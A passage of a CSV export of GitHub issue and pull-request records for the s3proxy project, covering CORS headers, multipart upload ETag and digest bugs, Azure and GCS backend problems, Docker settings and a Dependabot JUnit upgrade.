The current middleware API is not ideal for this but coincidentally jclouds `BlobStore.listObjects` returns `StorageMetadata` which has several fields that are usually null.  In this case the middleware would populate the fields but `S3ProxyHandler` must be changed to take advantage of these.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/350/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/350/comments,https://api.github.com/repos/gaul/s3proxy/issues/350/events,https://github.com/gaul/s3proxy/issues/350,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/349,845680611,MDU6SXNzdWU4NDU2ODA2MTE=,349,PutObjects support,848247,open,FALSE,NA,NA,0,2021-03-31T02:25:43Z,2021-03-31T02:25:43Z,NA,OWNER,NA,"Minio will implement an unpack RPC that S3Proxy could also benefit from:

https://twitter.com/abperiasamy/status/1376998079249833986

This is likely inspired by a similar Swift feature.  One of the potential use cases is uploading many small objects over a high-latency link.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/349/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/349/comments,https://api.github.com/repos/gaul/s3proxy/issues/349/events,https://github.com/gaul/s3proxy/issues/349,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/348,843210316,MDU6SXNzdWU4NDMyMTAzMTY=,348,release binary should have the suffix .jar,970935,closed,FALSE,NA,NA,2,2021-03-29T10:05:49Z,2021-03-29T11:47:51Z,2021-03-29T11:02:29Z,NONE,NA,"I have downloaded latest release (not source code) and got an file without any suffix (""s3proxy""). 

Because it is an jar file (I can start it via 'java -jar s3proxy').

My suggestion is to name the download file also 's3proxy.jar'.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/348/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/348/comments,https://api.github.com/repos/gaul/s3proxy/issues/348/events,https://github.com/gaul/s3proxy/issues/348,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/347,832132840,MDExOlB1bGxSZXF1ZXN0NTkzMzQzNTIy,347,Support for Junit 5 Extension mechanism,9478549,open,FALSE,NA,NA,3,2021-03-15T19:39:54Z,2021-04-13T16:19:06Z,NA,NONE,NA,"A proposal to close #288 

This feature adds support for Junit 5 test engine.

A user simply has to add this to its test class (as shown in the unit test added):
```
@RegisterExtension
static S3ProxyExtension EXTENSION = S3ProxyExtension.builder()
         .withCredentials(""access"", ""secret"")
         .build();
```",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/347/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/347/comments,https://api.github.com/repos/gaul/s3proxy/issues/347/events,https://github.com/gaul/s3proxy/pull/347,https://api.github.com/repos/gaul/s3proxy/pulls/347
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/346,823671042,MDExOlB1bGxSZXF1ZXN0NTg2MDgxMDI1,346,Make CORS handling optional,3904554,closed,FALSE,NA,NA,1,2021-03-06T15:09:56Z,2021-03-07T02:30:35Z,2021-03-07T02:30:26Z,CONTRIBUTOR,NA,"This makes it possible to construct the S3ProxyHandler.  
Making the CrossOriginResourceSharing public with public constructors caused more CheckStyle errors because of all the finals.
In my testing with AWS client v2 I also had to add HEAD to the methods.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/346/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/346/comments,https://api.github.com/repos/gaul/s3proxy/issues/346/events,https://github.com/gaul/s3proxy/pull/346,https://api.github.com/repos/gaul/s3proxy/pulls/346
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/345,822553072,MDExOlB1bGxSZXF1ZXN0NTg1MTU5MzM5,345,Make CrossOriginResourceSharing public,3904554,closed,FALSE,NA,NA,5,2021-03-04T22:17:19Z,2021-03-06T15:14:39Z,2021-03-05T03:18:21Z,CONTRIBUTOR,NA,I think cannot construct a S3ProxyHandler which is public without this class being public to pass to the constructor.,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/345/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/345/comments,https://api.github.com/repos/gaul/s3proxy/issues/345/events,https://github.com/gaul/s3proxy/pull/345,https://api.github.com/repos/gaul/s3proxy/pulls/345
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/344,793681855,MDExOlB1bGxSZXF1ZXN0NTYxMzI4NTA0,344,Better support for caching scenarios of CORS responses,10754110,closed,FALSE,NA,NA,2,2021-01-25T19:57:19Z,2021-01-26T08:04:13Z,2021-01-26T03:38:49Z,CONTRIBUTOR,NA,"If the allowed origin `*` is configured e.g. through config option `s3proxy.cors-allow-all=true` the `ACCESS_CONTROL_ALLOW_ORIGIN` header in CORS responses will now always be `*` and not the requested host from the `Origin` header. If only concrete allowed origins are configured the behaviour remains unchanged.
Furthermore the `ACCESS_CONTROL_ALLOW_METHODS` header will always include all allowed methods in the CORS response.
This is inline with a native S3 CORS response and will help esp. in CDN caching scenarios. All requested Origins can be served with a cached response.

Further changes:
* S3Proxy only accepts allowed methods from `CrossOriginResourceSharing.SUPPORTED_METHODS`, preventing operators to configure methods which do not provide CORS headers atm, like `HEAD` or `DELETE`.
* If configured allowed origins contains `*` all other configured origins are skipped and are not pattern matched -> Allow any origin
* Testcase for `cors-allow-all=true` added

Closes #343 ",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/344/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/344/comments,https://api.github.com/repos/gaul/s3proxy/issues/344/events,https://github.com/gaul/s3proxy/pull/344,https://api.github.com/repos/gaul/s3proxy/pulls/344
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/343,784929119,MDU6SXNzdWU3ODQ5MjkxMTk=,343,Missing CORS header in the response,22042933,closed,FALSE,NA,NA,11,2021-01-13T09:17:18Z,2021-01-26T03:38:49Z,2021-01-26T03:38:49Z,NONE,NA,"Hello,

First, thank you for the project, it is the only S3 proxy available that we found that support a progress bar while downloading, which help us!

We setup the s3proxy the following way
```
    - S3PROXY_AUTHORIZATION=none
    - S3PROXY_CORS_ALLOW_ALL=true
    - S3PROXY_CORS_ALLOW_ORIGINS=*
    - S3PROXY_CORS_ALLOW_METHODS=GET PUT POST HEAD DELETE
    - S3PROXY_CORS_ALLOW_HEADERS=*
    - JCLOUDS_PROVIDER=s3
```

As far as I understand CORS should allow any origins with any headers and any methods.

Unfortunately, all the CORS header are missing from the response

Here is the curl command we use:
`curl  -H ""Access-Control-Request-Method: GET"" -H ""Origin: http://localhost"" --head http://localhost/<bucket_name>/open-sans-3.ttf`
 
And the response we got:
```
Date: Wed, 13 Jan 2021 09:14:19 GMT
x-amz-request-id: XXXXXXXXXXXXXXX
Content-Type: binary/octet-stream
ETag: ""XXXXXXXXXXXXXXX""
Last-Modified: Tue, 29 Dec 2020 16:30:17 GMT
x-amz-storage-class: STANDARD
Content-Length: 28100
Server: Jetty(9.2.z-SNAPSHOT)
```


I can confirm that when we are curling directly the bucket with the same command, the following header will be in the response:

```
access-control-allow-origin: *
access-control-allow-methods: GET, HEAD, DELETE, PUT, POST
access-control-expose-headers: Access-Control-Allow-Origin
```


I am confused if we are doing something wrong, if it's a bug or a missing feature at the moment. ",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/343/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/343/comments,https://api.github.com/repos/gaul/s3proxy/issues/343/events,https://github.com/gaul/s3proxy/issues/343,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/342,782606502,MDExOlB1bGxSZXF1ZXN0NTUyMTI5OTM0,342,Use the old environment variable for virtual host,2637884,closed,FALSE,NA,NA,3,2021-01-09T13:19:06Z,2021-01-10T01:00:00Z,2021-01-10T00:59:47Z,CONTRIBUTOR,NA,"This project used the env var `S3PROXY_VIRTUALHOST`, but then this PR: #341 added another declaration that used `S3PROXY_VIRTUAL_HOST`.

This PR fixes this, and goes back to `S3PROXY_VIRTUALHOST`.


Thanks !
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/342/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/342/comments,https://api.github.com/repos/gaul/s3proxy/issues/342/events,https://github.com/gaul/s3proxy/pull/342,https://api.github.com/repos/gaul/s3proxy/pulls/342
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/341,778146799,MDExOlB1bGxSZXF1ZXN0NTQ4Mjg3NzQ1,341,add virtual host to docker,3149885,closed,FALSE,NA,NA,1,2021-01-04T14:48:24Z,2021-01-04T16:17:26Z,2021-01-04T15:24:18Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/341/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/341/comments,https://api.github.com/repos/gaul/s3proxy/issues/341/events,https://github.com/gaul/s3proxy/pull/341,https://api.github.com/repos/gaul/s3proxy/pulls/341
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/340,775257719,MDU6SXNzdWU3NzUyNTc3MTk=,340,Using s3proxy for azure blob storage,13769039,closed,FALSE,NA,NA,1,2020-12-28T07:43:11Z,2021-03-31T02:23:05Z,2021-03-31T02:23:04Z,NONE,NA,"Hi,
2 Questions for the first time looking at this :
[1] Is there any documentation about the configuration which should be used for azure storage. I couldn't find an explanation about how to set the parameters for that.
[2] Is there any helm chart , or docker for using this in k8s for azure ?

Regards,
Rani",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/340/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/340/comments,https://api.github.com/repos/gaul/s3proxy/issues/340/events,https://github.com/gaul/s3proxy/issues/340,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/339,775086482,MDExOlB1bGxSZXF1ZXN0NTQ1ODQyMjAy,339,support custom s3 proxy endpoint in docker,3149885,closed,FALSE,NA,NA,3,2020-12-27T18:27:32Z,2020-12-28T14:39:17Z,2020-12-28T07:20:11Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/339/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/339/comments,https://api.github.com/repos/gaul/s3proxy/issues/339/events,https://github.com/gaul/s3proxy/pull/339,https://api.github.com/repos/gaul/s3proxy/pulls/339
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/338,732463766,MDU6SXNzdWU3MzI0NjM3NjY=,338,Multipart etag issues with filesystem and transient storage providers,13767993,open,FALSE,NA,NA,1,2020-10-29T16:23:49Z,2020-11-15T10:18:55Z,NA,NONE,NA,"I'm using `S3ProxyRule` in a JUnit test (it's really nice!) and I noticed that if I perform a multipart upload and then read back the resulting object metadata, the etag from the HEAD request doesn't match the etag from the multipart complete request.

Here's an example testcase:
```java
public class S3ProxyTest {
  @Rule
  public S3ProxyRule s3Proxy = S3ProxyRule.builder()
      .withCredentials(""access"", ""secret"")
      // .withBlobStoreProvider(""transient"")
      .build();

  @Test
  public void test() {
    final AmazonS3 s3Client = AmazonS3ClientBuilder
        .standard()
        .withCredentials(
            new AWSStaticCredentialsProvider(
                new BasicAWSCredentials(this.s3Proxy.getAccessKey(), this.s3Proxy.getSecretKey())))
        .withEndpointConfiguration(
            new AwsClientBuilder.EndpointConfiguration(this.s3Proxy.getUri().toString(),
                Regions.US_EAST_1.getName()))
        .build();
    s3Client.createBucket(""test-bucket"");

    final InitiateMultipartUploadResult initiateResult = s3Client
        .initiateMultipartUpload(new InitiateMultipartUploadRequest(""test-bucket"", ""test_object""));
    final UploadPartResult uploadPartResult = s3Client.uploadPart(new UploadPartRequest()
        .withBucketName(""test-bucket"")
        .withKey(""test_object"")
        .withUploadId(initiateResult.getUploadId())
        .withPartNumber(1)
        .withInputStream(new ByteArrayInputStream(""test"".getBytes())));

    final CompleteMultipartUploadResult completeResult = s3Client.completeMultipartUpload(
        new CompleteMultipartUploadRequest(
            ""test-bucket"",
            ""test_object"",
            initiateResult.getUploadId(),
            Collections.singletonList(uploadPartResult.getPartETag())));

    final String eTag = completeResult.getETag();

    final ObjectMetadata metadata = s3Client.getObjectMetadata(""test-bucket"", ""test_object"");
    Assert.assertEquals(eTag, metadata.getETag());
  }
}
```
This fails with 
```
org.junit.ComparisonFailure: 
Expected :59adb24ef3cdbe0297f05b395827453f-1
Actual   :d41d8cd98f00b204e9800998ecf8427e
```
with both the filesystem and transient providers.

I'm running this on a Mac, and it sounds like the lack of extended attributes support might the cause of the etag mismatch for the filesystem provider.  So if you want to say that's working as designed, that's fair.  But the transient provider would work just fine for my purposes- any chance it can be enhanced to save the multipart etag rather than recalculating it (incorrectly) on read?  Thanks!",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/338/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/338/comments,https://api.github.com/repos/gaul/s3proxy/issues/338/events,https://github.com/gaul/s3proxy/issues/338,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/337,720046085,MDExOlB1bGxSZXF1ZXN0NTAyMTMzODcw,337,Bump junit from 4.12 to 4.13.1,49699333,closed,FALSE,NA,NA,0,2020-10-13T09:24:35Z,2021-04-04T01:40:20Z,2021-04-04T01:40:16Z,CONTRIBUTOR,NA,"Bumps [junit](https://github.com/junit-team/junit4) from 4.12 to 4.13.1.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/releases"">junit's releases</a>.</em></p>
<blockquote>
<h2>JUnit 4.13.1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.1.md"">release notes</a> for details.</p>
<h2>JUnit 4.13</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.md"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/junit-team/junit4/commit/1b683f4ec07bcfa40149f086d32240f805487e66""><code>1b683f4</code></a> [maven-release-plugin] prepare release r4.13.1</li>
<li><a href=""https://github.com/junit-team/junit4/commit/ce6ce3aadc070db2902698fe0d3dc6729cd631f2""><code>ce6ce3a</code></a> Draft 4.13.1 release notes</li>
<li><a href=""https://github.com/junit-team/junit4/commit/c29dd8239d6b353e699397eb090a1fd27411fa24""><code>c29dd82</code></a> Change version to 4.13.1-SNAPSHOT</li>
<li><a href=""https://github.com/junit-team/junit4/commit/1d174861f0b64f97ab0722bb324a760bfb02f567""><code>1d17486</code></a> Add a link to assertThrows in exception testing</li>
<li><a href=""https://github.com/junit-team/junit4/commit/543905df72ff10364b94dda27552efebf3dd04e9""><code>543905d</code></a> Use separate line for annotation in Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/510e906b391e7e46a346e1c852416dc7be934944""><code>510e906</code></a> Add sub headlines to class Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae""><code>610155b</code></a> Merge pull request from GHSA-269g-pwp5-87pp</li>
<li><a href=""https://github.com/junit-team/junit4/commit/b6cfd1e3d736cc2106242a8be799615b472c7fec""><code>b6cfd1e</code></a> Explicitly wrap float parameter for consistency (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1671"">#1671</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/a5d205c7956dbed302b3bb5ecde5ba4299f0b646""><code>a5d205c</code></a> Fix GitHub link in FAQ (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1672"">#1672</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/3a5c6b4d08f408c8ca6a8e0bae71a9bc5a8f97e8""><code>3a5c6b4</code></a> Deprecated since jdk9 replacing constructor instance of Double and Float (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1660"">#1660</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/junit-team/junit4/compare/r4.12...r4.13.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=junit:junit&package-manager=maven&previous-version=4.12&new-version=4.13.1)](https://docs.github.com/en/github/managing-security-vulnerabilities/configuring-github-dependabot-security-updates)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language

You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/gaul/s3proxy/network/alerts).

</details>",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/337/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/337/comments,https://api.github.com/repos/gaul/s3proxy/issues/337/events,https://github.com/gaul/s3proxy/pull/337,https://api.github.com/repos/gaul/s3proxy/pulls/337
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/336,715752219,MDU6SXNzdWU3MTU3NTIyMTk=,336,Remove Azure > 256 MB blob workaround,848247,open,FALSE,NA,NA,0,2020-10-06T14:51:21Z,2020-10-06T14:51:21Z,NA,OWNER,NA,[JCLOUDS-1554](https://issues.apache.org/jira/browse/JCLOUDS-1554) and Azure API 2019-12-12 will allow up to 5 GB blobs.  This allows removing the > 256 MB workaround which should give better support for listing a multipart upload.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/336/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/336/comments,https://api.github.com/repos/gaul/s3proxy/issues/336/events,https://github.com/gaul/s3proxy/issues/336,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/335,714794955,MDU6SXNzdWU3MTQ3OTQ5NTU=,335,Exception with s3cmd: Index 1 out of bounds for length 1,53560658,open,FALSE,NA,NA,6,2020-10-05T12:27:29Z,2020-10-12T12:33:46Z,NA,NONE,NA,"Hi, i'm having an issue with using s3cmd with s3proxy.
I'm trying to do this simple PUT command:
`s3cmd put stam.txt s3://https://blobeastus.blob.core.windows.net/oded-test1/stam.txt `

The output i'm getting is:
```
WARNING: Retrying failed request: //blobeastus.blob.core.windows.net/oded-test1/stam.txt (Tunnel connection failed: 500 Index 1 out of bounds for length 1)
WARNING: Waiting 3 sec...
upload: 'stam.txt' -> 's3://https://blobeastus.blob.core.windows.net/oded-test1/stam.txt'  [1 of 1]
[s3proxy] W 10-05 13:18:55.467 S3Proxy-Jetty-17 o.g.s.o.e.j.server.HttpChannel:396 |::] blobeastus.blob.core.windows.net:443
java.lang.ArrayIndexOutOfBoundsException: Index 1 out of bounds for length 1
        at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:629)
        at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:76)
        at org.gaul.shaded.org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
        at org.gaul.shaded.org.eclipse.jetty.server.Server.handle(Server.java:499)
        at org.gaul.shaded.org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
        at org.gaul.shaded.org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:258)
        at org.gaul.shaded.org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
        at org.gaul.shaded.org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
        at org.gaul.shaded.org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
        at java.base/java.lang.Thread.run(Thread.java:834)
```

From checking the sources I see this is the 629 line in S3ProxyHandler.java:
```
// Validate container name
if (!uri.equals(""/"") && !isValidContainer(path[1]))
```

Can anyone point me what is wrong with my input? 
Thanks!
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/335/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/335/comments,https://api.github.com/repos/gaul/s3proxy/issues/335/events,https://github.com/gaul/s3proxy/issues/335,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/334,710190721,MDExOlB1bGxSZXF1ZXN0NDk0MDgyMDMz,334,CORS header for MultiPart Requests,10754110,closed,FALSE,NA,NA,1,2020-09-28T11:39:47Z,2020-09-30T15:13:20Z,2020-09-28T13:14:41Z,CONTRIBUTOR,NA,"Adding CORS headers Access-Control-Allow-Origin and Access-Control-Allow-Methods in Multipart Responses if the
Origin Header is included in the Request and does match the CORS rules.
This was requested in #331.

Unfortunately my spare time is very limited at the moment and I was not able to write a test case for the multi part uploads. I tried, but there seems to be no easy way to retrieve the response Headers e.g. from InitiateMultipartUploadResult like here: https://github.com/gaul/s3proxy/blob/master/src/test/java/org/gaul/s3proxy/AwsSdkTest.java#L481-L482 to verify that CORS headers are present.

So maybe some else could step in here and add a test.

I am sorry that I cannot provide more in the moment.

Super-seeds #332 ",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/334/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/334/comments,https://api.github.com/repos/gaul/s3proxy/issues/334/events,https://github.com/gaul/s3proxy/pull/334,https://api.github.com/repos/gaul/s3proxy/pulls/334
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/333,706357909,MDExOlB1bGxSZXF1ZXN0NDkwOTE5MDI4,333,Allow GCS backend to upload more than 32 parts,848247,closed,FALSE,NA,NA,0,2020-09-22T12:53:46Z,2021-03-07T08:54:22Z,2021-03-07T08:53:01Z,OWNER,NA,"This recursively combines up to 32 sets of 32 parts, allowing 1024
part multipart uploads.  Fixes #330.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/333/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/333/comments,https://api.github.com/repos/gaul/s3proxy/issues/333/events,https://github.com/gaul/s3proxy/pull/333,https://api.github.com/repos/gaul/s3proxy/pulls/333
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/332,697575737,MDExOlB1bGxSZXF1ZXN0NDgzNTAzOTg4,332,CORS header for MultiPart Requests,10754110,closed,FALSE,NA,NA,1,2020-09-10T07:55:53Z,2020-09-30T15:13:22Z,2020-09-28T11:40:13Z,CONTRIBUTOR,NA,"Adding CORS headers `Access-Control-Allow-Origin` and `Access-Control-Allow-Methods` in Multipart Reposnes if the
`Origin` Header is included in the Request and does match the CORS rules.
This was requested in #331.

Unfortunately my spare time is very limited at the moment and I was not able to write a test case for the multi part uploads. I tried, but there seems to be no easy way to retrieve the response Headers e.g. from `InitiateMultipartUploadResult` like here: https://github.com/gaul/s3proxy/blob/master/src/test/java/org/gaul/s3proxy/AwsSdkTest.java#L481-L482 to verify that CORS headers are present.

So maybe some else could step in here and add a test.

I am sorry that I cannot provide more in the moment.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/332/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/332/comments,https://api.github.com/repos/gaul/s3proxy/issues/332/events,https://github.com/gaul/s3proxy/pull/332,https://api.github.com/repos/gaul/s3proxy/pulls/332
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/331,695985030,MDU6SXNzdWU2OTU5ODUwMzA=,331,Multipart upload CORS headers,5357180,closed,FALSE,NA,NA,1,2020-09-08T15:46:02Z,2020-09-28T13:15:18Z,2020-09-28T13:15:08Z,NONE,NA,"Currently multipart upload does not fully support CORS headers.

Find more details from older issue: https://github.com/gaul/s3proxy/issues/142#issuecomment-513499929

@reimannf seems to have a solution for this. Could you please implement it?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/331/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/331/comments,https://api.github.com/repos/gaul/s3proxy/issues/331/events,https://github.com/gaul/s3proxy/issues/331,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/330,685695791,MDU6SXNzdWU2ODU2OTU3OTE=,330,Large multipart uploads with aws cli to GCS fail,53399,closed,FALSE,NA,NA,6,2020-08-25T18:24:29Z,2021-03-07T08:53:00Z,2021-03-07T08:53:00Z,NONE,NA,"I was using a docker image ([mysql-backup](https://hub.docker.com/r/databack/mysql-backup)) that uploads to a ""S3"" backend using the aws cli. Trying to use it with s3proxy connected to GCP as the upload destination fails with the following error.

`An error occurred (BadDigest) when calling the CompleteMultipartUpload operation`

More details from the log (includes the shell commands executed and full cli response)
```
+ AWS_ENDPOINT_OPT='--endpoint-url http://cloud-backups-s3proxy.default.svc.cluster.local'
+ aws --endpoint-url http://cloud-backups-s3proxy.default.svc.cluster.local s3 cp /tmp/backups/db_backup_2020-08-24T20:46:05Z.tgz s3://cloud-backups/db/db_backup_2020-08-24T20:46:05Z.tgz
Complupload failed: tmp/backups/db_backup_2020-08-24T20:46:05Z.tgz to s3://cloud-backups/db/db_backup_2020-08-24T20:46:05Z.tgz An error occurred (BadDigest) when calling the CompleteMultipartUpload operation (reached max retries: 4): Bad Request
```

I assume a similar error could be triggered by configuring s3 to use GCP, trying to use the aws s3 cli to to and upload, and using the `multipart_threshold` to force the cli to do multipart uploads for smaller files.

I also presume GCP and Amazon have different interpretations of how hash digests of multipart uploads should work.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/330/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/330/comments,https://api.github.com/repos/gaul/s3proxy/issues/330/events,https://github.com/gaul/s3proxy/issues/330,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/329,685506115,MDU6SXNzdWU2ODU1MDYxMTU=,329,Azure storage returns empty <Blobs> element,4990017,open,FALSE,NA,NA,2,2020-08-25T13:54:48Z,2020-08-26T22:27:23Z,NA,NONE,NA,"After some testing it looks like the fix in #326 is not sufficient. Sending a response to s3 client with neither `CommonPrefixes` nor `Contents` elements is not expected, at least by `s3cmd` and our backup tool. I suspect that s3proxy would have to handle this internally, issuing the next request(s) and returning it to the client only when it finally contains either `CommonPrefixes` or `Contents`

`s3cmd` fails with

```
DEBUG: s3cmd version 2.1.0
...

DEBUG: Canonical Request:
GET
/backup/
delimiter=%2F&prefix=data%2Fbackup%2Fsnapshots%2F
host:localhost:8080
x-amz-content-sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
x-amz-date:20200820T191251Z

host;x-amz-content-sha256;x-amz-date
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
----------------------
DEBUG: signature-v4 headers: {'x-amz-date': '20200820T191251Z', 'Authorization': 'AWS4-HMAC-SHA256 Credential=none/20200820/us-east-1/s3/aws4_request,SignedHeaders=host;x-amz-content-sha256;x-amz-date,Signature=53e4e909916546be4527f62475fcbb2ace0778ded959864eb05f1a7a512aecf4', 'x-amz-content-sha256': 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'}
DEBUG: Processing request, please wait...
DEBUG: get_hostname(backup): localhost:8080
DEBUG: ConnMan.get(): re-using connection: http://localhost:8080#1
DEBUG: format_uri(): /backup/?delimiter=%2F&prefix=data%2Fbackup%2Fsnapshots%2F
